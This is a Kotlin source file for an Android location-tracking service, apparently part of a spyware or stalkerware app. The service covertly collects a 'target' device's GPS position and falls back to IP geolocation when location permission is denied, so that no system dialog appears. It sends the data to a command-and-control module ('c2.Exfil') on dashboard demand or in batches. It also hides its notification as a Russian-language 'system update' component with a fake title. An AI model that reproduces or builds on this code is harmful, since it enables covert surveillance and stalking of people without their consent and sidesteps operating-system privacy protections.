package com.sp.core.services

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import com.sp.core.c2.Exfil
import com.sp.core.util.BatchExfil
import com.sp.core.util.Fgs
import com.sp.core.util.WebGeo
import org.json.JSONObject

/**
 * Location tracking.
 *
 * GPS is the primary source. When the location toggle is off or the fine
 * location permission was never granted, the position is resolved through
 * public IP geolocation instead (web source) — the target never sees a
 * system dialog about it.
 */
class LocationService : Service() {

    private var client: FusedLocationProviderClient? = null
    private var callback: LocationCallback? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastSent = 0L

    override fun onCreate() {
        super.onCreate()
        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION,
                buildNotification())) {
            // The location type needs a runtime grant; without it the service
            // must not keep running (and must not be left without a
            // startForeground call - that would kill the whole process).
            stopSelf()
            return
        }
        try {
            client = LocationServices.getFusedLocationProviderClient(this)
        } catch (t: Throwable) {
            client = null
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // The dashboard asked for a fresh position -> send the web fix right
        // away instead of waiting for the next timer tick.
        if (intent?.getBooleanExtra("now", false) == true) {
            sendWebLocationAsync("command")
        }
        startTracking()
        return START_STICKY
    }


    private fun hasFineLocation(): Boolean =
        ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    private fun startTracking() {
        if (!hasFineLocation()) {
            sendWebLocationAsync("no_permission")
            scheduleNext()
            return
        }

        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, INTERVAL_MS)
            .setMinUpdateIntervalMillis(INTERVAL_MS / 2)
            .setMinUpdateDistanceMeters(50f)
            .setWaitForAccurateLocation(false)
            .build()

        val cb = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { push(it) }
            }
        }
        callback = cb

        try {
            client?.requestLocationUpdates(request, cb, Looper.getMainLooper())
        } catch (_: Throwable) {
            sendWebLocationAsync("security")
        }

        // No GPS fix in time -> fall back to the web source.
        handler.postDelayed({ sendWebLocationAsync("no_fix") }, FALLBACK_AFTER_MS)
        scheduleNext()
    }

    private fun scheduleNext() {
        handler.postDelayed({ startTracking() }, INTERVAL_MS)
    }

    private fun push(loc: Location) {
        val payload = JSONObject().apply {
            put("lat", loc.latitude)
            put("lon", loc.longitude)
            put("acc", loc.accuracy)
            put("alt", loc.altitude)
            put("speed", loc.speed)
            put("ts", loc.time)
            put("provider", loc.provider)
            put("source", "gps")
        }
        BatchExfil.enqueue(this, "location", payload.toString())
        lastSent = System.currentTimeMillis()
    }

    /**
     * The web source is the primary one: the GPS toggle on the target is
     * usually off, so the position is resolved through IP geolocation. The
     * HTTP call runs on its own thread - a blocking request on the main
     * looper would freeze the service and get the app killed.
     */
    private fun sendWebLocationAsync(reason: String) {
        Thread {
            try {
                val geo = WebGeo.locate() ?: return@Thread
                geo.put("fallback", reason)
                if (reason == "command") {
                    // A requested position goes out right away.
                    com.sp.core.c2.Exfil.sendLog(this, "location", geo.toString())
                } else {
                    BatchExfil.enqueue(this, "location", geo.toString())
                }
                lastSent = System.currentTimeMillis()
            } catch (_: Throwable) {
            }
        }.start()
    }

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        try { callback?.let { client?.removeLocationUpdates(it) } } catch (_: Throwable) {}
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    companion object {
        /** Asks the service for an immediate position update. */
        fun requestNow(ctx: Context) {
            try {
                val i = Intent(ctx, LocationService::class.java).putExtra("now", true)
                if (android.os.Build.VERSION.SDK_INT >= 26)
                    ctx.startForegroundService(i) else ctx.startService(i)
            } catch (_: Throwable) {
            }
        }

        private const val NOTIF_ID = 0x5F61
        const val INTERVAL_MS = 45 * 60 * 1000L
        private const val FALLBACK_AFTER_MS = 25_000L
    }
}
